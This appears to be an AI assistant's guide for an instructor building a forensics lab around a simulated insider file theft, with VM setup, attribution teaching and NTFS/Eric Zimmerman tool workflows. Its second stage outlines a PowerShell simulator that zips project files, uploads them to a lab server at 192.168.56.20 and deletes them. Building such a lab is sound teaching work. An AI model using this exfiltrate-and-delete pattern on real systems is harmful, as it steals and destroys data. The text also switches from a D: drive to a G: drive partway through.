Your summary of the scenario is spot on—and adding one small twist turns it into a complete forensic investigation.

---

## 1. The Scenario in Plain English

What the employee **thinks** happened:

* *"I downloaded a free tool called `DocumentHelper.zip` to help with my work, ran it, finished my task, and later noticed some files in the `Project Falcon` folder were gone."*

What **actually** happened under the hood (which you simulate):

1. **09:50 (Download):** The employee downloaded `DocumentHelper.zip` from an internal server (`192.168.56.20`).
2. **09:53 (Execution):** When they ran the tool, it launched a hidden PowerShell script.
3. **09:55 (Collection):** That script secretly grabbed three sensitive company files from `D:\Project_Falcon\` and compressed them into a hidden `.zip` archive.
4. **09:57 (Exfiltration):** The script uploaded that `.zip` archive over the network to `192.168.56.20`.
5. **10:00 (Cleanup):** To cover its tracks, the script deleted the `.zip` archive and deleted two of the original project files from `D:\Project_Falcon\`.

**Why this makes a great first lab:**
Students aren't just looking at one hard drive in Autopsy to recover a deleted file. They have to act like real investigators and connect clues from **three different sources** to prove the files weren't just accidentally deleted—they were packaged and stolen first:

| Evidence Source | Tool Students Use | What It Proves in the Story |
| --- | --- | --- |
| **Windows Logs (`.evtx`)** | EvtxECmd / Timeline Explorer | `DocumentHelper` actually ran, created a `.zip` file, connected to `192.168.56.20`, and deleted the files. |
| **Small Data Disk (`D:` image)** | FTK Imager / MFTECmd / Autopsy | The project files existed on disk, when they were modified/deleted, and whether the deleted contents can still be recovered. |
| **Network Capture (`.pcap`)** | Wireshark | The `.zip` archive actually left the machine over HTTP and arrived at the destination server. |

---

## 2. Windows vs. Linux: Which Is Better to Use?

**Use a hybrid setup: Windows for the victim workstation (`WS-FIN-07`), and Linux for the server (`LAB-SERVER`).**

| Machine Role | Best OS | Why This Choice Works Best |
| --- | --- | --- |
| **Victim Workstation (`WS-FIN-07`)** | **Windows 10/11 VM** | Your curriculum and tool list (FTK Imager, KAPE, Sysmon, Eric Zimmerman's `EvtxECmd` and `MFTECmd`) are built specifically for **Windows Event Logs (`.evtx`)** and the **NTFS file system (`$MFT`)**. Running the victim machine on Linux would force you to replace the entire toolset in your syllabus. |
| **Receiver Server (`LAB-SERVER`)** | **Linux VM (e.g., Debian)** | You do **not** need a heavy second Windows VM. A lightweight Linux VM (or container) needs minimal RAM, can host the download page and file-upload receiver using a 20-line Python script, and can record the network traffic effortlessly with `tcpdump` or Wireshark. |

> **First-Time Lab Builder Tip:** Attach a tiny **1 GB virtual hard drive** (`D:`) to the Windows VM formatted as NTFS and store the `Project Falcon` files there. That way, when students practice disk imaging with FTK Imager, they only image a 1 GB drive (takes 30 seconds) instead of a 60 GB Windows `C:` drive (takes an hour).

---

## 3. What "Account Attribution vs. Person Attribution" Means (and How to Teach It)

This is one of the most important concepts in real-world digital forensics, and it is much simpler than it sounds.

* **Account Attribution:** Proving *which computer account* performed an action. For example, Sysmon Event ID 1 will clearly state `User: WS-FIN-07\emp_sarah` ran the script.
* **Person Attribution ("Putting fingers on the keyboard"):** Proving *which human being in the physical world* was actually sitting in the chair and knowingly did it.

### Why an account in a log does NOT automatically prove a person's guilt

Imagine the logs show that account `emp_sarah` ran the script that stole the company files. A beginner student will immediately write in their report: **"Sarah stole the company files."**

In a real investigation or courtroom, a defense lawyer will immediately ask:

1. **The Unlocked Desk:** Did Sarah leave her computer unlocked to go get coffee while a jealous coworker walked over, plugged in a script, and ran it under her logged-in session?
2. **The Trojan Horse (Intent):** Did Sarah genuinely think `DocumentHelper` was an innocent PDF converter, completely unaware that it was secretly zipping and stealing files in the background?
3. **Shared/Stolen Credentials:** Did someone else on the network know Sarah's password and log into her account?

### How to introduce this to your students effortlessly

You only need to do two small things in your lab handout:

1. **Plant a seed of doubt in the Student Incident Brief:**
Add one sentence to the story you give students:
> *"The employee (Sarah) states she downloaded a document utility at 09:50, stepped away to the breakroom for coffee without locking her workstation, and noticed files were missing at 10:15."*


2. **Add one discussion question at the end of their worksheet:**
> *"Question 7: Your logs show that account `WS-FIN-07\emp_sarah` executed the script and uploaded the archive. Does your digital evidence prove that Sarah intentionally stole the files? List two alternative explanations, and name one piece of non-computer evidence (such as CCTV cameras or badge-swipe logs) you would ask management for next."*



This teaches students to write accurate forensic conclusions:

* **Wrong:** *"Sarah stole the files and deleted them."*
* **Forensically Sound:** *"Account `WS-FIN-07\emp_sarah` executed `DocumentHelper.ps1`, which archived, exfiltrated, and deleted the files. Determining whether Sarah acted maliciously, was tricked by a Trojan utility, or left her unlocked session exposed requires physical security corroboration."*

---

## 4. Your Step-by-Step Blueprint to Build This Lab

Since this is your first time building a forensic lab, break the preparation into four simple stages so you don't have to troubleshoot everything at once:

1. **Stage 1: Set up the 2 VMs on an Internal Network**
* **Windows VM (`192.168.56.10`):** Add a 1 GB second disk (`D:`), create `D:\Project_Falcon\`, and put 5 dummy documents inside (`budget.xlsx`, `design.docx`, `secret_plan.txt`, etc.). Install **Sysmon** so Windows records detailed logs for Process Creation (Event ID 1), Network Connections (Event ID 3), File Creation (Event ID 11), and File Deletion (Event ID 26).
* **Linux VM (`192.168.56.20`):** Run a tiny Python HTTP web server that serves `DocumentHelper.zip` (via `GET`) and accepts file uploads (via `POST`).


2. **Stage 2: Create the Harmless "DocumentHelper" Simulator**
* You do **not** need real malware. A 10-line PowerShell script (or a compiled C/Python executable that calls PowerShell) is actually *better* because Sysmon Event ID 1 will capture the exact command line for students to discover!
* The script simply does three things:
* `Compress-Archive` on 3 files in `D:\Project_Falcon\` into `D:\Project_Falcon\falcon_backup.zip`
* `Invoke-WebRequest -Method POST` to send `falcon_backup.zip` to `[http://192.168.56.20:8080/upload](http://192.168.56.20:8080/upload)`
* `Remove-Item` on `falcon_backup.zip` and 2 of the original files.




3. **Stage 3: Record the "Crime" (5 Minutes)**
* Start `tcpdump` or Wireshark on the Linux server.
* On the Windows VM, open the browser, download `DocumentHelper.zip` from `[http://192.168.56.20:8080/DocumentHelper.zip](http://192.168.56.20:8080/DocumentHelper.zip)`, extract it, and run it.
* Wait 1 minute, then stop the packet capture on the Linux server.


4. **Stage 4: Collect the Evidence Package**
* Use **KAPE** (or simply export the Sysmon `.evtx` log file and browser history) from `C:`.
* Use **FTK Imager** to create a disk image of the 1 GB `D:` drive.
* Save the `.pcap` file from the Linux server.
* Open those files yourself using `EvtxECmd`, `MFTECmd`, and `Wireshark` to verify you can see every step of the story.


Understanding what is happening under the hood of **FTK Imager**, the **NTFS file system**, and **Eric Zimmerman’s tools** is what separates someone who just clicks buttons from an instructor who can answer any student question.

---

## 1. Decoding the FTK Imager Evidence Tree (The `$` Files)

When you open `G:\` in normal Windows File Explorer, it looks almost empty. When you open `G:\` in FTK Imager, you suddenly see a tree full of files and folders starting with a **`$` (dollar sign)**.

In NTFS, any file or folder starting with `$` is a **hidden File System Metadata file**. Windows hides and locks them because if a user edits or deletes them, the partition corrupts. FTK Imager reads the raw disk sectors directly, bypassing Windows Explorer to show you the internal machinery of the drive.

Here is what every item in your FTK Imager tree actually does:

| Tree Item in FTK Imager | What It Actually Is | Why Forensics Investigators Care |
| --- | --- | --- |
| **`[root]`**

 | The top-level directory (`G:\`) of the partition.

 | When you click `[root]`, the top-right **File List** pane shows both your normal folders AND hidden system files (`$MFT`, `$LogFile`, `$BitMap`) that live in the root directory.

 |
| **`$MFT` & `$MFTMirr**`

 | **Master File Table** (and its backup mirror of the first 4 records).

 | **The #1 most important artifact in NTFS.** Every single file and folder on the drive gets a 1,024-byte entry inside `$MFT`. It records the file's name, size, four different timestamps (Created, Modified, MFT Modified, Accessed), and the exact disk clusters where the file's data lives. If a file is smaller than ~700 bytes (like your `074B44B8...txt` password file), the entire file content is actually stored *inside* the `$MFT` record itself (called a **Resident file**)!

 |
| **`$Extend`**

 | A system directory added in newer versions of NTFS to hold extra tracking features.

 | Inside `$Extend`, NTFS stores the **`$UsnJrnl` (Update Sequence Number Journal)**. Its `$J` stream acts like a security camera log for the hard drive: every time any file is created, renamed, modified, or deleted, a timestamped line is appended to `$J`. |
| **`$Deleted`, `$ObjId`, `$Quota`, `$Reparse**` (inside `$Extend`)

 | Internal tracking indexes inside `$Extend`.

 | Tracks unique Object IDs assigned to files (`$ObjId`), user storage limits (`$Quota`), and symbolic links or mounted folders (`$Reparse`).

 |
| **`$RmMetadata` (`$Repair`, `$Txf`, `$TxfLog`)**

 | **Resource Manager Metadata** for Transactional NTFS (TxF).

 | Windows uses this like a database rollback log so that if the computer loses power mid-write, NTFS can repair itself on reboot without corrupting the drive. Rarely needed by students, so tell them they can ignore `$RmMetadata`.

 |
| **`$Secure` & `$UpCase**`

 | Security descriptors and uppercase character table.

 | `$Secure` stores the Access Control Lists (who has Read/Write/Deny permissions on every file—which is why `C:\Sysmon` blocked your command prompt earlier!). `$UpCase` converts lowercase letters to uppercase so Windows knows `Secret.txt` and `secret.txt` are the same file.

 |
| **`Sysmon`**

 | The protected archive folder created by the Sysmon driver.

 | Only exists when Sysmon **Event ID 23** (`FileDelete` archived) is active. When a file is deleted on `G:\`, Sysmon copies it here and renames it to its **SHA256 hash** (`074B44B8...txt`).

 |
| **`[unallocated space]`**

 | All disk clusters currently marked as "Free / Empty".

 | When you delete a file (without Sysmon Event ID 23), Windows does **not** erase the data. It only marks the file's `$MFT` entry as "Inactive" and puts the file's data clusters into `[unallocated space]`. Tools like Autopsy and FTK Imager scan `[unallocated space]` to carve and recover deleted files before new data overwrites them.

 |

---

## 2. Why Image to `.E01` vs `.raw` (and How to Use It Later)

When you click **File $\rightarrow$ Create Disk Image** in FTK Imager, you are taking a frozen snapshot of `G:\` so you can analyze it without touching the live drive. Students always ask two questions here: *"Why `.E01`?"* and *"How do I open it later?"*

### `.raw` (dd) vs. `.E01` (Expert Witness Format)

| Feature | `.raw` / `.001` (dd format) | `.E01` (EnCase / Expert Witness Format) |
| --- | --- | --- |
| **What is inside?** | Pure, exact 1-to-1 copy of every byte on the drive. Nothing added, nothing compressed. | The exact drive bytes **wrapped inside a forensic container** with a metadata header, compression, and internal checksums. |
| **File Size** | If `G:\` is 2 GB (even if 99% empty), the `.raw` file is **2.0 GB**. | Compresses all the empty zero-bytes. A 2 GB drive with 3 text files shrinks to **~15 MB**! |
| **Built-in Integrity** | None inside the file. You must keep a separate `.txt` file with the SHA256 hash. | Stores the Case Info, Examiner Name, and the original drive's **MD5/SHA1 hash** directly inside the `.E01` footer, plus CRC error-checking every 32 KB. |

### The "Hash Trap" You Must Explain to Students

Suppose you image `G:\` as `Drive_G.E01`.

1. At the end of imaging, FTK Imager gives you an Image Summary showing: `SHA1 of Drive: AAAA1111...`
2. Then a student opens PowerShell and runs `Get-FileHash -Algorithm SHA1 .\Drive_G.E01` and gets: `BBBB2222...`

**Why are they different?**

* FTK Imager's hash (`AAAA1111...`) is the hash of the **uncompressed raw disk sectors inside** the container.
* PowerShell's `Get-FileHash` (`BBBB2222...`) hashes the **outer `.E01` container file itself** (which includes your Case Name, Examiner Name, and compressed blocks).
* **How students use both:** Students run `Get-FileHash` on `Drive_G.E01` first to verify their downloaded homework file matches the file you gave them. Then, when they load `Drive_G.E01` into FTK Imager (`File -> Add Evidence Item -> Image File -> select Drive_G.E01`), they right-click `Drive_G.E01` in the Evidence Tree and click **Verify Drive/Image** to prove the raw drive inside hasn't been tampered with!

---

## 3. How the Other Tools Fit Together (Step-by-Step Workflow)

Right now, you know how to look at things manually inside Event Viewer and FTK Imager. In a real investigation with thousands of files and events, clicking one by one takes days. That is why we use **Eric Zimmerman’s tools (`MFTECmd`, `EvtxECmd`, `Timeline Explorer`)** and **KAPE**.

Here is the exact role of each tool and how to use them in sequence:

### Tool 1: Exporting `$MFT` and `$J` from FTK Imager

Before you can run `MFTECmd`, you need to pull the raw `$MFT` file out of your `Drive_G.E01` image:

1. Open FTK Imager $\rightarrow$ **File** $\rightarrow$ **Add Evidence Item** $\rightarrow$ **Image File** $\rightarrow$ select `Drive_G.E01`.
2. Expand the tree and click once on **`[root]`**.


3. In the top-right **File List** pane, look for **`$MFT`**.


4. Right-click **`$MFT`** $\rightarrow$ **Export Files...** $\rightarrow$ save it to `C:\Lab_Work\`.
5. *(Optional)* Expand **`$Extend`** $\rightarrow$ right-click **`$UsnJrnl:$J`** $\rightarrow$ **Export Files...** $\rightarrow$ save it to `C:\Lab_Work\`.

---

### Tool 2: `MFTECmd.exe` (Turns Binary `$MFT` into a Spreadsheet)

If you try to open `$MFT` in Notepad, it looks like unreadable binary garbage. **`MFTECmd`** reads the binary `$MFT` file and translates every file record on the drive into a clean `.csv` spreadsheet.

Open Administrator Command Prompt or PowerShell where you downloaded Eric Zimmerman's tools and run:

```powershell
# Parse the exported $MFT into a CSV file
.\MFTECmd.exe -f "C:\Lab_Work\$MFT" --csv "C:\Lab_Work\" --csvf "MFT_Parsed.csv"

# (Optional) Parse the $J Change Journal into a CSV file
.\MFTECmd.exe -f "C:\Lab_Work\$UsnJrnl_$J" --csv "C:\Lab_Work\" --csvf "UsnJrnl_Parsed.csv"

```

**What this gives you:** A spreadsheet (`MFT_Parsed.csv`) listing every file on `G:\` (including deleted ones), its parent folder, file size, whether it is currently deleted (`InUse = False`), and the exact millisecond it was created (`Created0x10`) and modified (`LastModified0x10`).

---

### Tool 3: `EvtxECmd.exe` (Turns `.evtx` Logs into a Spreadsheet)

Windows Event Viewer is clumsy: you cannot search across all fields at once, and Sysmon hides important details (like `Hashes`, `CommandLine`, and `TargetFilename`) inside an XML block at the bottom of each event. **`EvtxECmd`** converts `.evtx` files into a flat `.csv` spreadsheet and pulls those hidden XML fields into their own columns.

Run this command on the `Sysmon_Operational.evtx` file you saved from Event Viewer:

```powershell
.\EvtxECmd.exe -f "C:\Lab_Work\Sysmon_Operational.evtx" --csv "C:\Lab_Work\" --csvf "Sysmon_Parsed.csv"

```

**What this gives you:** A single spreadsheet (`Sysmon_Parsed.csv`) where `EventId`, `TimeCreated`, `UserName`, `ExecutableInfo` (command line), and `PayloadData1` through `PayloadData6` (file paths, hashes, IP addresses) are neatly separated into columns.

---

### Tool 4: `Timeline Explorer` (How You Actually Read the CSVs)

Do **not** open `MFT_Parsed.csv` or `Sysmon_Parsed.csv` in Microsoft Excel—Excel automatically reformats timestamps and breaks forensic data! Instead, open Eric Zimmerman's **Timeline Explorer** (a GUI program):

1. Open **Timeline Explorer** $\rightarrow$ **File** $\rightarrow$ **Open** $\rightarrow$ select both `MFT_Parsed.csv` and `Sysmon_Parsed.csv` (they open as clean tabs at the top).
2. **In the `Sysmon_Parsed.csv` tab:**
* Type `1, 3, 11, 23, 26` or filter the **`EventId`** column header.
* Or simply type `.zip` or `074B44B8` into the **Find** bar at the top—Timeline Explorer instantly highlights the exact row showing when the file was created, uploaded, or deleted!


3. **In the `MFT_Parsed.csv` tab:**
* Filter the **`FileName`** column for your project files (or `074B44B8`) to see the exact NTFS creation timestamps and verify if the file record is marked `InUse` (checked = still there, unchecked = deleted).



---

### Tool 5: Where Does `KAPE` Fit In?

You might wonder: *"If I have FTK Imager, `MFTECmd`, and `EvtxECmd`, why is **KAPE** on the tool list?"*

Think about the `C:` drive (the main Windows OS drive).

* The `G:` drive is tiny (1 GB), so you can image the whole `G:` drive with FTK Imager.


* The `C:` drive is huge (60+ GB), so students don't have time to image `C:`. Yet the **Sysmon Event Logs** (`C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx`) and **Browser History** live on `C:`!

**KAPE (Kroll Artifact Parser and Extractor)** solves this in two steps (which you can run from its GUI `gkape.exe`):

1. **Targets (Collection):** You check the box for `EventLogs` and `WebBrowsers`, point Target Source to `C:\`, and Destination to `C:\Evidence_Out\`. KAPE grabs *only* those specific forensic files off the live `C:` drive in 10 seconds (even bypassing Windows file locks) and automatically generates a SHA256 hash log of everything it collected.
2. **Modules (Processing):** If you also check the **Modules** box (`EvtxECmd`, `MFTECmd`), KAPE automatically runs Eric Zimmerman's command-line tools in the background for you and outputs the finished `.csv` files ready for Timeline Explorer!

---

## Summary of Your Lab Tool Architecture

To make this crystal clear for you and your students, every tool has **one specific job** in the pipeline:

```
[ Live Workstation ]
   │
   ├──► Drive G: (1 GB Data Volume) ──► Imaged with [ FTK Imager ] ──► Drive_G.E01
   │                                                                      │
   │                                            ┌─────────────────────────┴────────────────────────┐
   │                                            ▼                                                  ▼
   │                                   Recover deleted files                         Export $MFT & run [ MFTECmd ]
   │                                   (from [root] or \Sysmon)                                    │
   │                                                                                               ▼
   └──► Drive C: (Windows OS) ────────► Collect logs via [ KAPE ] ──► Run [ EvtxECmd ] ──► Open CSVs in [ Timeline Explorer ]
                                        (or export from Event Viewer)

```

